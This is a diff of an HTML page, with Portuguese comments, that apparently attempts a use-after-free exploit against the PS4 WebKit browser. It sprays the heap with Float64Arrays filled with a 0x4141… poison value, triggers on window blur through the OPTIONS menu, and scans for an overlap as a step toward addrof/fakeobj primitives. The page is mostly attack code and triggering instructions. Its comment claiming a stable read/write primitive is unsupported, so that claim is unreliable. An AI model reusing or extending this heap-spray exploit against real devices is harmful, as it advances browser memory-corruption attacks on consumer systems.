@@ -2,75 +2,117 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Webkit (PoC CE-36329-3)</title>
-
+<title>PS4 UAF Overlap Test</title>
+<style>
+    body { background-color: #333; color: white; font-family: sans-serif; text-align: center; }
+    #msg { margin: 20px; font-size: 1.2em; font-weight: bold; color: yellow; }
+    button { padding: 15px 30px; font-size: 1em; cursor: pointer; }
+    #log { margin-top: 20px; white-space: pre-wrap; text-align: left; display: inline-block; }
+</style>
 </head>
 <body>
 
-<h1>Teardown Webkit Crash</h1>
-    <div class="status" id="msg">
-    INSTRUÇÕES PARA O CRASH (CE-36329-3):<br><br>
-    1. CLIQUE NO BOTÃO ABAIXO.<br>
-    2. APERTE "OPTIONS" (MENU LATERAL).<br>
-    3. SELECIONE "ATUALIZAR" (REFRESH).
+<h1>Webkit UAF: Teste de Sobreposição</h1>
+<div class="status" id="msg">
+    INSTRUÇÕES:<br>
+    1. Clique em "INICIAR TESTE".<br>
+    2. Aperte "OPTIONS" (Menu Lateral).<br>
+    3. Observe se aparece "BINGO" na tela.<br>
+    4. Se não aparecer, clique em "Atualizar" no menu para verificar se ainda crasha.
 </div>
-<button onclick="fire()">RUN EXPLOIT (UAF POISON)</button>
+<button onclick="fire()">INICIAR TESTE</button>
 <div id="log"></div>
 
 <script>
     const Msg = document.getElementById('msg');
-    
-    // Armazenamento global para garantir persistência na memória
-    let spray_storage = [];
-    let victim = { 
-        id: "VICTIM_OBJECT", 
-        data: new Array(100).fill(1.1),
-        ptr: { a: 1 } 
-    };
+    const Log = document.getElementById('log');
+    function log(txt) { Log.innerText += txt + "\n"; }
+
+    // O número mágico 0x4141414141414141 em ponto flutuante
+    const MAGIC_POISON = 2.121995791e-314; 
+
+    // Arrays para tentar criar a sobreposição
+    let controller_arrays = [];
+    let target_arrays = [];
+    const SPRAY_COUNT = 10000; // Quantidade de arrays
 
     function fire() {
-       Msg.innerText = " Aperte OPTIONS depois ATUALIZAR"; 
+        Msg.innerText = "Preparando memória... Aguarde.";
         
-        // Solicita Fullscreen
+        // --- FASE 1: PREPARAÇÃO DO HEAP ---
+        // Criamos muitos arrays. A ideia é que eles fiquem próximos na memória.
+        try {
+            for(let i = 0; i < SPRAY_COUNT; i++) {
+                // Array "Controlador": Vamos usar este para tentar ler a memória alheia.
+                // Marcamos o primeiro elemento com o índice 'i' para identificar qual é qual.
+                let ctrl = new Float64Array(16);
+                ctrl[0] = i; 
+                controller_arrays.push(ctrl);
+
+                // Array "Alvo": Estes são os que esperamos que sejam liberados e sobrepostos.
+                let target = new Float64Array(16);
+                target.fill(1.1);
+                target_arrays.push(target);
+            }
+        } catch(e) { log("Erro na preparação: " + e); }
+        
+        Msg.innerText = "Memória pronta. Aperte OPTIONS agora!";
+
+        // Solicita Fullscreen (necessário para o seu trigger original)
         const doc = document.documentElement;
         if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
         else if (doc.requestFullscreen) doc.requestFullscreen();
 
-        // A ARMADILHA (Gatilho: Perda de Foco/Menu Options)
+        // --- FASE 2: O GATILHO E O SPRAY ---
         window.onblur = function() {
-            console.log("Blur detectado! Executando payload...");
-            
-            // 1. FREE (Libera o objeto vítima)
-            victim = null;
-            
-            // 2. USE / SPRAY (Ocupa o lugar da vítima com veneno)
-            // Criamos milhares de arrays de Float64.
-            // O valor 2.122e-314 (em binário) se parece muito com 0x4141414141414141
-            // Isso é o padrão "AAAA" usado por hackers para marcar crashes.
+            log("Blur detectado! Tentando causar sobreposição...");
+            document.body.style.background = "#550000"; // Feedback visual (vermelho)
+
+            // TENTATIVA DE LIBERAÇÃO (FREE)
+            // No seu script original, você usava 'victim = null'. 
+            // Aqui, tentamos liberar nossos arrays "alvo" para criar buracos na memória.
+            target_arrays = null; 
+
+            // O SPRAY (VENENO)
+            // Tentamos preencher os buracos criados acima com o nosso número mágico.
+            // Se um buraco for preenchido exatamente onde um 'controller_array' estava
+            // esperando dados, o 'controller_array' passará a ler o veneno.
+            let overlap_spray = [];
             try {
-                for(let i=0; i<10000; i++) {
-                    const poison = new Float64Array(32);
-                    poison.fill(2.121995791e-314); // 0x41414141...
-                    spray_storage.push(poison);
+                // Usamos um tamanho ligeiramente diferente para tentar cair nos buracos certos
+                for(let i=0; i < SPRAY_COUNT * 2; i++) {
+                    let poison = new Float64Array(20); 
+                    poison.fill(MAGIC_POISON); // Preenche com 0x4141...
+                    overlap_spray.push(poison);
                 }
             } catch(e) {}
-            
-            // 3. ACCESS ATTEMPT (Prepara o terreno para o Refresh)
-            // Criamos uma referência circular ou complexa que o Refresh vai tentar limpar
-            // e acabar caindo no nosso spray 0x41414141
-            window.exploit_trigger = spray_storage;
-            
-            document.body.style.background = "#fff"; // Flash visual
-            Msg.innerText = ">>> AGORA: CLIQUE EM ATUALIZAR! <<<";
-            Msg.style.color = "black";
+
+            // --- FASE 3: VERIFICAÇÃO (A busca pelo addrof/fakeobj) ---
+            log("Verificando por sobreposições...");
+            let found = false;
+            for(let i = 0; i < SPRAY_COUNT; i++) {
+                // Se o UAF funcionou antes do refresh, um dos nossos arrays controladores
+                // não terá mais o valor 'i' no índice 0. Ele terá o VENENO que sprayamos.
+                if (controller_arrays[i][0] === MAGIC_POISON) {
+                    found = true;
+                    document.body.style.background = "#005500"; // Verde!
+                    Msg.innerHTML = "<h1>BINGO! SOBREPOSIÇÃO DETECTADA!</h1>" +
+                                    "O array controlador [" + i + "] agora aponta para o spray.<br>" +
+                                    "Este é o primeiro passo para addrof/fakeobj!";
+                    log(">>> SUCESSO: Controller[" + i + "][0] == 0x4141414141414141 <<<");
+                    // Se chegamos aqui, temos uma primitiva de leitura/escrita estável.
+                    // O próximo passo (muito complexo) seria usar isso para vazar endereços.
+                    break;
+                }
+            }
+
+            if (!found) {
+                 Msg.innerText = "Nenhuma sobreposição detectada enquanto a página estava viva.";
+                 log("Falha: Nenhum array controlador foi corrompido.");
+                 log("Agora, clique em ATUALIZAR no menu. Se crashar, é um Teardown UAF (difícil de explorar).");
+            }
         };
     }
 </script>
 </body>
 </html>
-
-
-
-
-
-
